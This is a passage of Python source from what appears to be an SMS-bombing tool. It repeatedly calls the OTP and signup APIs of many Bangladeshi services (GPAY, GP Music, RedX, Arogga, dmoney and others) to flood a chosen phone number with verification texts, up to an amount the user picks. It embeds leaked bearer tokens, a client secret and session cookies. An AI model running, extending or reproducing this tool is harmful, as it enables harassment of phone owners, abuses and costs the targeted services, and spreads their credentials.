            data_dmoney = '{"clientType":"dmoney-customer-wallet","dateOfBirth":"04\/11\/1996","email":"aru1234@yahoo.com","fullName":"ARU","mobileNumber":"'+number+'","operatorCode":"3","pin":"qLg\/BH8nl1IzjzVtgPx8mQ==","pinHMac":"mwUD43\/XYDBN4gs0fMQxtBJqVGSod2NZRlUvq6QnN4E=","referralCode":"","userType":"5","deviceName":"OnePlus A5010 Android 7.1.2","deviceNumber":"e57cd87b2c9b47b1","hardwareSignature":"20ad24ea74d4efdbf96413fb97f428cd6227f157610655ebeeb6c87d2b8bbd9bbdd0a343b4ba09ddda9b69de8bf5770edb618e3820bf0ff7fb8d777612a7f0f1","mobileAppVersion":"2.2.2_DM","mobileAppVersionCode":53,"productCode":"DM","requestId":"42EE607762F2F08A","sessionToken":""}'
            requ_dmoney_server = requests.post(url_dmoney, headers=headers_dmoney, data=data_dmoney)
            if requ_dmoney_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # Bikroy
        try:
            url_bikroy = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + number
            requ_bikroy_server = requests.get(url_bikroy)
            if requ_bikroy_server.json()["otp_length"] == 6:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()

                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # WEB ONE
        try:
            url_web_one = "http://27.131.15.19/lstyle/api/lsotprequest"
            headers_web_one = {"Content-Type": "application/json"}
            data_web_one = '{"shortcode":"2494905","msisdn":"88' + number + '"}'
            requ_web_one_server = requests.post(url_web_one, headers=headers_web_one, data=data_web_one)
            if requ_web_one_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # Two
        try:
            url_web_two = "http://27.131.15.19:80/lstyle/api/lsotprequest"
            headers_web_two = {"Content-Type": "application/json"}
            data_web_two = '{"shortcode":"2494905","msisdn":"88' + number + '"}'
            requ_web_two_server = requests.post(url_web_two, headers=headers_web_two, data=data_web_two)
            if requ_web_two_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_arogga = "https://api.arogga.com/v1/auth/sms/send?f=app&v=4.4.3&os=android&osv=25"
            headers_arogga = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "208",
                "Accept-Encoding": "gzip, deflate",
                "User-Agent": "okhttp/4.9."}
            data_arogga = "mobile=%2B88" + number + "&fcmToken=dfixXPTmTeSRBAFf-utxA-%253AAPA91bG1chvzjost2jd7UNgNeQFJ3s-0ynvXZs4Mat3RuXF0xz4c1yMMn83TL-pwVmAP7NIG45l4M-uJ0JK3n9r5kiDmMI_M6_wkN37O8arFojbXXljcRfj9YgY0jX-SJuumo36V5m8s&referral="
            requ_arogga_server = requests.post(url_arogga, headers=headers_arogga, data=data_arogga)
            if requ_arogga_server.json()["status"] == "success":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_drive = "https://www.mydrivebd.com/sapi/profile?action=signup&notify=true&rid=0.14346360928321888"

            headers_drive = {"Host": "www.mydrivebd.com",
                             "content-length": "126",

                             "x-deviceid": "web-08474b7fff1202e709e8935c10cf5ca3",
                             "content-type": "application/json;charset=UTF-8",
                             "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo Y85) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
                             "accept": "*/*",
                             "origin": "https://www.mydrivebd.com",
                             "sec-fetch-site": "same-origin",
                             "sec-fetch-mode": "cors",
                             "sec-fetch-dest": "empty",
                             "referer": "https://www.mydrivebd.com/",
                             "accept-encoding": "gzip, deflate, br",
                             "accept-language": "en-US,en;q=0.9",
                             "cookie": "JSESSIONID=0E317BDBE17C4F72F27F47F3047D50FE.1i164",
                             "cookie": "loginRetriesLeft=5",
                             "cookie": "loginRetriesLeft_Date=%3B%20expires%3DTue%2C%2027%20Sep%202022%2021%3A39%3A57%20GMT",
                             "cookie": "cookiesAccepted=true",
                             "cookie": "_ga_G32R4HEST2=GS1.1.1664228417.1.0.1664228417.0.0.0",
                             "cookie": "_ga=GA1.1.1935620814.1664228418"}
            data_drive = '{"data":{"user":{"generic":{"userid":"88' + number + '","password":"' + ''.join(
                random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in
                range(15)) + '","l10n":"en","acceptedtermsandconditions":true}}}}'
            requ_drive_server = requests.post(url_drive, headers=headers_drive, data=data_drive)
            if requ_drive_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        try:
            url_lanka = "https://napi.dmoney.com.bd:6066/DmoneyPlatform/um_public_ekyc_checkMobileEmail"
            headers_lanka = {"productCode": "FS",
                            "Authorization": "bearer 9gp0IvDK_5DX1StqaF4__rHnboeHCwayrMsdZ3aNGhoF1jykX7xyoQBASWnSTbnZ5NmMXDinOBhI4rjy-0mXcoPUsFu7Xbdga-sy3TunDsxToMzLqn-zB_3Opi7FbHOLU47kQFLzkPdF8_QADX9eC3Sy-j9IBH5JnoSvL4YADKZic6D_Ok8j7zwfWy3kcXKRgyFje5ft0s-5ztXWGUy-6YOGdbThWoy6LBbK_Yr3Ek8YYGi6",
                            "accept-language": "en", "Content-Type": "application/json",
                            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)",
                            "Host": "napi.dmoney.com.bd:6066", "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
                            "Content-Length": "493"}
            data_lanka = '{"ekycApplicationData":{"emailId":"mr_kille@yahoo.com","id":0,"mobileNumber":"' + number + '","productCode":"FS"},"channel":"ANDROID_APP","deviceName":"Asus ASUS_Z01QD Android 7.1.2","deviceNumber":"751405a75d71e619","hardwareSignature":"14879d1fcce97c13dd673ee7ce6d7f1c69f56f8880c2d2326f675473472c1dcefb603902376020fc0a75d8a3868a84ebb5c1211abe38c75583d412783bbfcb40","mobileAppVersion":"4.1.1_RELEASE","mobileAppVersionCode":37,"productCode":"FS","requestId":"2015BDC18305FBFB","sessionToken":""}'
            requ_lanka_server = requests.post(url_lanka, headers=headers_lanka, data=data_lanka)
            if requ_lanka_server.json()['status'] == 200 and requ_lanka_server.json()['errors'] == None:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # MR healler
        try:
            url_mrhealer = "https://mrhealerbd.com/api/v1/auth/send_otp"
            headers_mrhealer = {"Content-Type" : "application/x-www-form-urlencoded"}
            data_mrhealer = "phone="+number+"&userType=patient"
            requ_mrhealer_server = requests.post(url_mrhealer, headers=headers_mrhealer, data=data_mrhealer)
            if requ_mrhealer_server.json()["message"] == "Successfully sent OTP":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # LAZZ PHARMA
        try:
            url_lazz ="https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister"
            headers_lazz = {"Content-Type":"application/json","Access-Control-Allow-Origin":"*"}
            data_lazz = '{"ActivityId":"9535be07-848a-42b4-9da4-4375d148fa1a","Phone":"'+number+'"}'
            requ_lazz_server = requests.post(url_lazz, headers=headers_lazz, data=data_lazz)
            if requ_lazz_server.json()["IsError"] == 0:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # rin
        try:
            url_rin = "https://www.rin.com.bd/users/ajax/sendotp"
            headers_rin = {"Content-Type" : "application/x-www-form-urlencoded","Accept":"application/json, text/javascript, /; q=0.01","X-Requested-With":"XMLHttpRequest"}
            data_rin = "mobile="+number+"&ci_csrf_token="
            requ_rin_server = requests.post(url_rin, headers=headers_rin, data=data_rin)
            if requ_rin_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass

        # RED X
        try:
            url_redX = "https://api.redx.com.bd/v1/user/signup"
            headers_redX = {
                "Cookie": "_fbp=fb.2.1665770836920.1536218668; _ga=GA1.3.2006512700.1665770837; _gid=GA1.3.1994739738.1665770837; _gat_gtag_UA_159382318_1=1; _hjSessionUser_2064965=eyJpZCI6ImY3ODFmMjQ1LWRmN2MtNWNhNy04NmRlLWYzZWE4MTk5N2NmMCIsImNyZWF0ZWQiOjE2NjU3NzA4MzcyOTYsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2064965=eyJpZCI6IjMwZDMyNWEzLTJhMGQtNGIyMi1iMmQxLWUzMzU1ODc0YTUzYyIsImNyZWF0ZWQiOjE2NjU3NzA4Mzc0MDEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0",
                "Content-Length": "67",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Sec-Ch-Ua-Mobile": "?0",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36",
                "Origin": "https://redx.com.bd",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://redx.com.bd/"}
            data_redX = '{"name":"' + number + '","phoneNumber":"' + number + '","service":"redx"}'
            requ_redX_server = requests.post(url_redX, headers=headers_redX, data=data_redX)
            if requ_redX_server.json()["body"]["message"] == f"A verification code has been sent to {number}":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass


        # TAP
        try:
            ID = uuid.uuid4()
            url_tap = "https://api.bdkepler.com/api_middleware-0.0.2-RELEASE/registration-generate-otp"
            headers_tap = {"Content-Type":"application/json"}
            data_tap = '{"deviceId":"'+str(ID)+'","operator":"Robi","walletNumber":"'+number+'"}'
            requ_tap_server = requests.post(url_tap, headers=headers_tap, data=data_tap)
            if requ_tap_server.status_code == 200 and requ_tap_server.json()['statusCode'] == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(1.5)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except Exception as err:
            print(err)

def my_gp():
    global operator
    clr()
    banner_premium()
    option_gp = '''
    [1] GPAY
    [2] GP MUSIC
'''
    printchar(random.choice(colorArr)+option_gp,0.01)
    inputConnectOptionGP = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION: {random.choice(colorArr)}"))
    if inputConnectOptionGP == '01' or inputConnectOptionGP == '1':
        clr()
        banner_premium()
        def inValid():
            global number, country_valid, amount
            number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
            amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [UNLIMITED]: {random.choice(colorArr)}"))
            country_valid = number[:3]

        inValid()
        if number == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            my_gp()
        if amount == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            my_gp()
        elif len(number) != 11:
            printchar(f"{red}    WRONG NUMBER", 0.05)
            time.sleep(2)
            my_gp()
        else:
            if country_valid == grameenohone:
                operator = "GrameenPhone"
            elif country_valid == grameenohone_miror:
                operator = "GrameenPhone"
            else:
                printchar(f"{red}    INVALID OPERATOR", 0.05)
                time.sleep(2)
                my_gp()
            if amount != '':
                if number in numbers:
                    printchar(f"{red}    PROTECTED NUMBER", 0.05)
                    sys.exit()
                else:
                    try:
                        url = "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup"
                        headers = {'Accept': 'application/json', 'Content-Type': 'application/json; charset=utf-8',
                                   'Accept-Encoding': 'gzip, deflate', 'User-Agent': 'okhttp/4.9.1'}
                        data = '{"deviceId":"' + str(random.randint(10000000000000000,99999999999999999)) + '","msisdn":"' + number + '","tran_type":"OTPREQSIGNUP"}'
                        requ = requests.post(url, data=data, headers=headers)
                        if requ.json()['message'] == "You already have GPAY wallet. If you forget PIN, please call 21200 for help.":
                                url = "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignin"
                        else:
                            url = url
                        phone = "+88" + number
                        getIPjson = requests.get("http://ip-api.com/json/")
                        ip = getIPjson.json()['query']
                        infoC = random.choice(colorArr)
                        bombInfo = (f'{infoC}\n'
                                    f'     ══════════════════════════════════════\n'
                                    f'     {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       \n'
                                    f'     {random.choice(colorArr)}  BOMBING AMOUNT : {random.choice(colorArr)}{amount}        \n'
                                    f'     {random.choice(colorArr)}  YOUR IP : {random.choice(colorArr)}{ip} \n'
                                    f'     {random.choice(colorArr)}  OPERATOR : {random.choice(colorArr)}{operator}\n'
                                    f'     {infoC}══════════════════════════════════════\n'
                                    f'    ')
                        clr()
                        banner_premium()
                        print(bombInfo)
                        i = 0
                        print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
                        while i < amount:
                                data = '{"deviceId":"' + str(random.randint(10000000000000000,99999999999999999)) + '","msisdn":"' + number + '","tran_type":"OTPREQSIGNUP"}'
                                requ = requests.post(url, data=data, headers=headers)
                                if requ.json()["message"] == "OTP is required to sign in, Please check sms":
                                    i += 1
                                    print_text = "[" + str(i) + "]"
                                    sys.stdout.write(print_text)
                                    sys.stdout.flush()
                                    time.sleep(1.5)
                                    sys.stdout.write("\b" * len(print_text))
                                    if i == amount:
                                        print("[" + str(i) + "]")
                                        fb()
                                        break
                                    else:
                                        pass
                                else:
                                    printchar(f"{red}    API DEAD", 0.05)
                    except:
                        pass
            else:
                printchar(f"{red}    WRONG AMOUNT", 0.05)
                my_gp()
    # ghp music
    elif inputConnectOptionGP == '02' or inputConnectOptionGP == '2':
        clr()
        banner_premium()
        def inValid():
            global number, country_valid, amount
            number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
            amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [UNLIMITED]: {random.choice(colorArr)}"))
            country_valid = number[:3]
        inValid()
        if number == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            my_gp()
        if amount == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            my_gp()
        elif len(number) != 11:
            printchar(f"{red}    WRONG NUMBER", 0.05)
            time.sleep(2)
            my_gp()
        else:
            if country_valid == grameenohone:
                operator = "GrameenPhone"
            elif country_valid == grameenohone_miror:
                operator = "GrameenPhone"
            else:
                printchar(f"{red}    INVALID OPERATOR", 0.05)
                time.sleep(2)
                my_gp()
            if amount != '':
                if number in numbers:
                    printchar(f"{red}    PROTECTED NUMBER", 0.05)
                    sys.exit()
                else:
                    try:
                        try:
                            url_t = "https://api.gpmusic.co/v2/oauth2/token"
                            headers_t = {'Content-Type': 'application/x-www-form-urlencoded'}
                            data_t = "client_secret=a41e79d013c550229421d7adedeb501b2a9f8240&client_id=8ee9eb276be94a6abc50077d8ef1b4d7&grant_type=client_credentials"
                            get_t = requests.post(url_t, data=data_t, headers=headers_t)
                            token = get_t.json()["access_token"]
                            url = "https://api.gpmusic.co/v2/codes"
                            headers = {
                                'User-Agent': 'Gp/4.5.4 BeatSDK/4.4.8 Dalvik/2.1.0 (Linux;Android 7.1.2; A5010 Build/uboot)',
                                'Authorization': 'Bearer ' + token,
                                'X-Country': 'bd',
                                'Content-Type': 'application/json; charset=utf-8'}
                            data = '{"msisdn":"88'+number+'"}'
                            url_c = 'https://api.gpmusic.co/v2/users'
                            c = requests.post(url_c, data=data, headers=headers)
                        except:
                            printchar(f'{redBold}    NO INTERNET', 0.01)
                        phone = "+88" + number
                        getIPjson = requests.get("http://ip-api.com/json/")
                        ip = getIPjson.json()['query']
                        infoC = random.choice(colorArr)
                        bombInfo = (f'{infoC}\n'
                                    f'     ══════════════════════════════════════\n'
                                    f'     {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       \n'
                                    f'     {random.choice(colorArr)}  BOMBING AMOUNT : {random.choice(colorArr)}{amount}        \n'
                                    f'     {random.choice(colorArr)}  YOUR IP : {random.choice(colorArr)}{ip} \n'
                                    f'     {random.choice(colorArr)}  OPERATOR : {random.choice(colorArr)}{operator}\n'
                                    f'     {infoC}══════════════════════════════════════\n'
                                    f'    ')
                        clr()
                        banner_premium()
                        print(bombInfo)
                        i = 0
                        print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
                        while i < amount:
                            requ = requests.post(url, data=data, headers=headers)
                            if requ.json() == {}:
                                i += 1
                                print_text = "[" + str(i) + "]"
                                sys.stdout.write(print_text)
                                sys.stdout.flush()
                                time.sleep(1.5)
                                sys.stdout.write("\b" * len(print_text))
                                if i == amount:
                                    print("[" + str(i) + "]")
                                    fb()
                                    break
                                else:
                                    pass
                            else:
                                printchar(f"{red}    API DEAD", 0.05)
                    except:
                        pass
            else:
                printchar(f"{red}    WRONG AMOUNT", 0.05)
                my_gp()
    else:
        printchar(f"{red}    INVALID INPUT", 0.05)
        time.sleep(2)
        my_gp()
